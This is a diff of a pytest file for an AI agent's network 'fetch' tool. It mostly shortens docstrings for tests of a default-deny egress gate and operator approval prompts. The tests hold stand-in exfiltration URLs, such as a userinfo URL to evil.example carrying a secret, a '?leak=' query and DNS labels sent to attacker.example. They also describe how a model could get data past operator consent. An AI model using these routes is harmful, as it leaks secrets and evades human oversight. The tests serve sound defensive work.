@@ -2,8 +2,8 @@
 # Copyright 2026 Eric Lesiuta
 """`fetch`: the one way a worker with no network reads a URL.
 
-It is an egress channel a model drives, so every check here is a default-deny
-and the operator's allow-list is what makes a read silent.
+It is an egress channel a model drives, so every check here is a default-deny and the operator's
+allow-list is what makes a read silent.
 """
 
 from __future__ import annotations
@@ -37,8 +37,7 @@ class _Body(httpx2.SyncByteStream):
 def _fetch_serving(
     monkeypatch: pytest.MonkeyPatch, *, headers: dict[str, str], content: bytes
 ) -> None:
-    """Point `fetch` at an in-memory server answering one GET, with the host
-    resolving to a public address."""
+    """Point `fetch` at an in-memory server answering one GET on a name that resolves public."""
     from agent6.tools import fetch as fetch_mod
 
     def _public(*_a: object, **_k: object) -> list[tuple[int, int, int, str, tuple[str, int]]]:
@@ -65,9 +64,7 @@ def _fetch_serving(
         "ftp://example.com/x",
         "/etc/passwd",
         "https:///nohost",
-        # urlsplit itself refuses this one; the dispatcher's catch-all
-        # relabelled it "failed:", the one fetch refusal that read unlike the
-        # others.
+        # urlsplit itself refuses this one; the catch-all relabelled it "failed:", unlike a refusal.
         "https://[::1",
     ],
 )
@@ -87,9 +84,7 @@ def test_only_https_with_a_host_is_fetched(url: str) -> None:
     ],
 )
 def test_a_literal_address_off_the_public_internet_is_refused(host: str) -> None:
-    """SSRF is the whole threat: the agent process sits inside the operator's
-    network and holds their credentials. A literal needs no lookup, so it is
-    refused before anyone is even asked about it."""
+    """A literal address is refused before anyone is asked: SSRF is the whole threat."""
     with pytest.raises(FetchRefusedError, match="not a public address"):
         check_url(f"https://{host}/x")
 
@@ -97,8 +92,7 @@ def test_a_literal_address_off_the_public_internet_is_refused(host: str) -> None
 def test_a_name_resolving_off_the_public_internet_is_refused(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    """A name resolves only inside `fetch`, behind the operator's gate; an
-    answer off the public internet is refused there."""
+    """A name resolves only inside `fetch`, behind the gate; a non-public answer is refused."""
 
     def _local(*_a: object, **_k: object) -> list[tuple[int, int, int, str, tuple[str, int]]]:
         return [(0, 0, 0, "", ("127.0.0.1", 443))]
@@ -130,8 +124,10 @@ def test_the_allow_list_matches_hosts_not_prefixes(
 
 def test_a_host_the_operator_never_named_is_asked_about(tmp_path: Path) -> None:
     """The list is the standing approval; a host off it is the operator's call.
-    The ask shows the parsed host plus the full path and query (the query is a
-    GET's exfil channel), never the raw URL."""
+
+    The ask shows the parsed host plus the full path and query (a GET's exfil channel), never the
+    raw URL.
+    """
     asked: list[str] = []
 
     def _deny(request: ApprovalRequest, /) -> ApprovalAnswer:
@@ -163,8 +159,7 @@ def test_an_allowed_host_is_never_prompted_for(
 
 
 def test_the_tool_is_hidden_when_commands_already_have_the_network(tmp_path: Path) -> None:
-    """With `sandbox.network = "host"` the worker can run curl. Two ways to do
-    one thing is the thing we do not do."""
+    """With `sandbox.network = "host"` the worker can run curl, so `fetch` is not offered."""
     blocked = ToolDispatcher(root=tmp_path, config=Config())
     allowed = ToolDispatcher(
         root=tmp_path, config=Config.model_validate({"sandbox": {"network": "host"}})
@@ -174,18 +169,13 @@ def test_the_tool_is_hidden_when_commands_already_have_the_network(tmp_path: Pat
 
 
 def test_a_url_naming_one_host_and_dialling_another_is_refused() -> None:
-    """httpx builds an Authorization header from userinfo, so `@` is the model
-    choosing a credential AND hiding the real host: the operator's eye lands on
-    `docs.python.org` while the query string goes to `evil.example`."""
+    """Userinfo in a URL is refused: `@` chooses a credential and hides the real host."""
     with pytest.raises(FetchRefusedError, match="credentials"):
         check_url("https://docs.python.org@evil.example/exfil?k=SECRET")
 
 
 def test_the_approval_prompt_shows_the_full_path_and_query() -> None:
-    """The consent line is the operator's whole view of the operation, and a GET
-    carries data out in its query string. The path was clipped at 200 chars and
-    the query dropped entirely, so `example.com /doc` was consent to
-    `?leak=SECRET` -- the exact exfiltration the fetch gate exists to catch."""
+    """The consent line carries the full path and query, a GET's exfiltration channel."""
     secret = "SECRET_EXFIL_TOKEN"
     long_path = "/" + "p" * 300
     prompt = check_url(f"https://example.com{long_path}?leak={secret}").prompt()
@@ -196,10 +186,7 @@ def test_the_approval_prompt_shows_the_full_path_and_query() -> None:
 def test_allowing_every_command_does_not_allow_the_network(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
-    """One "s" at a run_command prompt set a session marker the shared approver
-    short-circuits on -- so every later fetch, to any host, was auto-approved
-    for the rest of the run. The operator was answering about commands: both
-    the prompt and the modal say so."""
+    """An "s" answered at a run_command prompt never auto-approves later fetches."""
     from agent6.events import EventSink
     from agent6.sessions.ipc import COMMAND_SCOPE, set_away_mode, set_session_allow
     from agent6.tools.operator_prompts import OperatorPrompts
@@ -215,8 +202,7 @@ def test_allowing_every_command_does_not_allow_the_network(
     ).approve
 
     assert approve("Allow run_command: ls", scope=COMMAND_SCOPE) is True
-    # away-mode deny, so the opted-out call refuses instead of polling for a
-    # front-end that will never attach.
+    # away-mode deny, so the opted-out call refuses instead of polling for a front-end.
     set_away_mode(session_dir, "deny")
     assert approve("Allow fetch: evil.example /x") is False
 
@@ -224,11 +210,7 @@ def test_allowing_every_command_does_not_allow_the_network(
 def test_answering_allow_all_on_a_fetch_prompt_allows_no_commands(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
-    """The mirror leak of the test above, and the wider one: the front-end used
-    to decide what a click MEANT, so an "a" typed at a fetch prompt (a gate that
-    opts out of standing answers) set the one global marker and granted every
-    command for the rest of the run. The asking side decides now, and a prompt
-    with no scope has nothing to grant."""
+    """An "a" typed at a fetch prompt grants nothing: the asking side decides what it means."""
     from agent6.events import EventSink
     from agent6.sessions.ipc import COMMAND_SCOPE, session_allow_set
     from agent6.tools.operator_prompts import OperatorPrompts
@@ -252,16 +234,14 @@ def test_answering_allow_all_on_a_fetch_prompt_allows_no_commands(
 
     approve("Allow fetch: evil.example /x")
     assert not session_allow_set(session_dir, COMMAND_SCOPE)
-    # And the prompt never offered it: an "allow all" that covers only the call
-    # it was clicked on is a button that lies about itself.
+    # The prompt never offered it: an "allow all" covering one call would lie about itself.
     approve("Allow run_command: ls", scope=COMMAND_SCOPE)
     assert "[y/N]" in shown[0] and "allow all" not in shown[0]
     assert "allow all" in shown[1]
 
 
 def test_a_hidden_fetch_cannot_still_be_dispatched(tmp_path: Path) -> None:
-    """Every other hiding rule has a matching refusal in dispatch; this one had
-    none, so exposure and enforcement could drift."""
+    """Every hiding rule has a matching refusal in dispatch, so exposure and enforcement agree."""
     cfg = Config.model_validate({"sandbox": {"network": "host"}})
     d = ToolDispatcher(root=tmp_path, config=cfg)
     assert "fetch" not in d.available_tool_names()
@@ -273,10 +253,7 @@ def test_a_hidden_fetch_cannot_still_be_dispatched(tmp_path: Path) -> None:
 def test_fetch_is_hidden_wherever_a_command_reaches_the_network(
     tmp_path: Path, isolation: IsolationLevel
 ) -> None:
-    """Only strict has network namespaces, so every other level puts a command
-    on the host network whatever the config says. Reading the config value
-    instead of the resolved one left the model both ways round to the same
-    network, which is the thing the rule exists to prevent."""
+    """The rule reads the resolved isolation: only strict has network namespaces."""
     d = ToolDispatcher(
         root=tmp_path,
         config=Config.model_validate({"sandbox": {"network": "auto"}}),
@@ -294,11 +271,11 @@ def test_a_plain_text_response_streams_back(monkeypatch: pytest.MonkeyPatch) -> 
 
 
 def test_a_compressed_response_is_refused_not_decoded(monkeypatch: pytest.MonkeyPatch) -> None:
-    """The `Accept-Encoding: identity` REQUEST header binds nothing: httpx
-    picks its decoder from the RESPONSE header, so a hostile server's
-    `Content-Encoding` expanded a small body in memory before the size cap
-    could count it (8 KiB of zstd measured out at 256 MiB in one chunk).
-    Anything but identity is refused, never decoded."""
+    """A `Content-Encoding` other than identity is refused, never decoded.
+
+    Httpx picks its decoder from the response header, so a hostile body expands before the size cap
+    counts it (8 KiB of zstd measured out at 256 MiB in one chunk).
+    """
     _fetch_serving(
         monkeypatch,
         headers={"content-type": "text/plain", "content-encoding": "gzip"},
@@ -319,9 +296,11 @@ def test_an_oversized_body_is_refused_while_it_arrives(monkeypatch: pytest.Monke
 def test_a_denied_fetch_never_touches_the_resolver(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
-    """A DNS query for `<data>.attacker.example` delivers its label to whoever
-    runs that name's authoritative server: resolving ahead of the gate was an
-    egress channel no allow-list and no approver ever saw."""
+    """A URL's host is not resolved before the gate approves the fetch.
+
+    A DNS query for `<data>.attacker.example` delivers its label to that name's server: an egress
+    channel no allow-list ever saw.
+    """
     resolved: list[object] = []
 
     def _spy(*args: object, **kwargs: object) -> list[object]:
@@ -340,8 +319,7 @@ def test_a_denied_fetch_never_touches_the_resolver(
 
 
 def test_a_machine_state_gets_no_network(tmp_path: Path) -> None:
-    """It answers about ITS input. A deliverable assembled from a page the
-    state fetched is not the deliverable the operator asked for."""
+    """`fetch` answers about its input; a page it fetched is not the operator's deliverable."""
     from agent6.tools.schema import mode_tools
 
     assert "fetch" in mode_tools("run").names
@@ -351,9 +329,7 @@ def test_a_machine_state_gets_no_network(tmp_path: Path) -> None:
 
 
 def test_a_port_out_of_range_is_a_fetch_refusal_and_a_note_needs_a_30x() -> None:
-    """`check_url` never touched the port, so a URL with port 99999 passed
-    the gate and `fetch` raised a bare ValueError after the approval was
-    answered; and the redirect note rode on any Location, a 201's included."""
+    """`check_url` refuses an out-of-range port, and the redirect note rides only on a redirect."""
     from agent6.tools.fetch import FetchRefusedError, check_url
     from agent6.tools.results import FetchResult
 
@@ -370,8 +346,7 @@ def test_a_port_out_of_range_is_a_fetch_refusal_and_a_note_needs_a_30x() -> None
 
 
 def test_the_approval_line_names_a_port_other_than_443() -> None:
-    """`https://h.example:8443/admin` was approved as `h.example /admin` and
-    dialled on 8443: the operator consented to a host, not the port."""
+    """The consent line names the port: the operator consents to `h.example:8443`, not to a host."""
     from agent6.tools.fetch import check_url
 
     assert check_url("https://h.example:8443/admin").prompt() == "h.example:8443 /admin"
